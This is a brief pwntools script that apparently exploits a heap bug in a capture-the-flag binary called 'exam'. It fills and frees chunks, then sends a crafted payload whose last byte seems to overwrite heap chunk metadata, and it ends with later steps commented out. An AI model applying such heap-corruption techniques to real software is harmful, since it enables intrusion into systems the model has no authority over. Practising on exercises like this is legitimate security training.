from pwn import *


context.binary = elf = ELF('./exam')
p = process('./exam')
gdb.attach(p, 'init-pwndbg\ninit-pwngdb')

def choice(num):
    p.sendlineafter("> ", str(num))


def add_summary(summary):
    choice(1)
    if len(summary) < 0x80:
        summary += '\n'
    p.sendafter("> ", summary)


def remove_summary(idx):
    choice(2)
    p.sendlineafter("> ", str(idx))


def create_crib():
    choice(4)

def remove_crib():
    choice(5)

add_summary("A"*(0x7f))
add_summary("B"*(0x7f))
add_summary("C"*(0x7f))
add_summary("D"*(0x7f))
add_summary("E"*(0x7f))

remove_summary(2)

add_summary(p64(144*3) * (128/8) + p8(0x90))
# add_summary("B"*(0xf0/2))

# create_crib()

p.interactive()
